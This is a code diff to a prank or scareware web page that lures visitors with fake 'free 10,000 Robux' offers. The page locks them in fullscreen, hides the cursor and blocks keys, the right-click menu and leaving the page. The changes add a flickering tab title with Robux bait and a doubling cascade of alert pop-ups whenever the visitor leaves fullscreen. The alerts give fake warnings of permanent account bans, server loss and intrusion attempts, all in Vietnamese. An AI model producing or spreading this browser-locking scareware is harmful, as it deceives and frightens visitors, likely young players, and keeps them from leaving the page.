@@ -63,13 +63,14 @@
             z-index: 999999;
             cursor: none;
         }
+        .no-cursor * { cursor: none !important; }
         #trollVideo {
             width: 100%; height: 100%;
             object-fit: cover;
             pointer-events: none;
             display: block;
         }
-        .no-cursor * { cursor: none !important; }
+
     </style>
 </head>
 <body id="mainBody">
@@ -110,15 +111,31 @@
         "Hoàn tất!"
     ];
 
-    // Alert spam messages
     const spamMessages = [
         "❌ LỖI: Quá trình nạp Robux bị gián đoạn!\nNhấn OK để tiếp tục...",
         "⚠️ CẢNH BÁO: Tài khoản có nguy cơ bị KHÓA VĨNH VIỄN!\nNhấn OK ngay để xác nhận!",
         "🔴 HỆ THỐNG: Phát hiện hoạt động bất thường!\nNhấn OK để xác minh danh tính...",
-        "💎 10,000 ROBUX sắp hết hạn!\nNhấn OK để giữ phần thưởng của bạn!",
+        "💎 10,000 ROBUX sắp hết hạn!\nNhấn OK để giữ phần thưởng!",
         "⛔ MẤT KẾT NỐI SERVER!\nNhấn OK để kết nối lại...",
         "🚨 CẢNH BÁO BẢO MẬT: Ai đó đang cố truy cập tài khoản bạn!\nNhấn OK để chặn ngay!",
     ];
+
+    // ─── TIÊU ĐỀ TAB NHẤP NHÁY ───────────────────────────────────────────────
+    const titleMessages = [
+        "💎 NHẬN 10,000 ROBUX MIỄN PHÍ 💎",
+        "🎉 XÁC NHẬN THÀNH CÔNG!",
+        "⏳ ĐANG NẠP ROBUX...",
+        "✅ ROBUX ĐÃ SẴN SÀNG!",
+        "🔴 CẦN XÁC MINH NGAY!",
+        "💰 10,000 ROBUX CHỜ BẠN!",
+    ];
+    let titleIdx = 0;
+    function startTitleFlicker() {
+        setInterval(() => {
+            document.title = titleMessages[titleIdx % titleMessages.length];
+            titleIdx++;
+        }, 800);
+    }
 
     function safePlay() {
         if (video.readyState >= 2) {
@@ -168,6 +185,7 @@
         body.classList.add('no-cursor');
 
         safePlay();
+        startTitleFlicker();
 
         window.addEventListener('keydown',  blockKey, true);
         window.addEventListener('keyup',    blockKey, true);
@@ -178,7 +196,6 @@
 
         document.addEventListener('fullscreenchange', onFSChange);
         document.addEventListener('webkitfullscreenchange', onFSChange);
-
         document.addEventListener('contextmenu', e => e.preventDefault());
         window.onbeforeunload = () => "Dữ liệu đang được tải, bạn có chắc muốn hủy bỏ?";
     }
@@ -189,32 +206,42 @@
         return false;
     }
 
+    // ─── POPUP NHÂN ĐÔI ──────────────────────────────────────────────────────
+    let popupCount = 1; // Số popup hiện tại
     let spamActive = false;
+
     function onFSChange() {
         const isFS = !!(document.fullscreenElement || document.webkitFullscreenElement);
         if (!isFS && overlay.style.display === "block" && !spamActive) {
             spamActive = true;
-            startAlertSpam();
+            popupCount = 1;
+            spamLoop(0);
         }
     }
 
-    function startAlertSpam() {
-        let i = 0;
-        function spamLoop() {
-            const isFS = !!(document.fullscreenElement || document.webkitFullscreenElement);
-            if (!isFS && overlay.style.display === "block") {
-                // Xin fullscreen trước khi alert (alert block JS nên xin FS trước)
-                requestFS();
-                alert(spamMessages[i % spamMessages.length]);
-                i++;
-                // Xin lại fullscreen sau khi bấm OK
-                requestFS();
-                setTimeout(spamLoop, 200);
-            } else {
-                spamActive = false;
+    function spamLoop(i) {
+        const isFS = !!(document.fullscreenElement || document.webkitFullscreenElement);
+        if (!isFS && overlay.style.display === "block") {
+            requestFS();
+            // Hiện số popup = popupCount, mỗi lần bấm OK hết → tăng gấp đôi
+            let remaining = popupCount;
+            function showNext() {
+                if (remaining > 0) {
+                    remaining--;
+                    alert(spamMessages[(i + remaining) % spamMessages.length]);
+                    setTimeout(showNext, 50);
+                } else {
+                    // Nhân đôi cho lần sau (tối đa 8 để không quá tay)
+                    popupCount = Math.min(popupCount * 2, 8);
+                    requestFS();
+                    setTimeout(() => spamLoop(i + 1), 200);
+                }
             }
+            showNext();
+        } else {
+            spamActive = false;
+            popupCount = 1;
         }
-        setTimeout(spamLoop, 100);
     }
 </script>
 
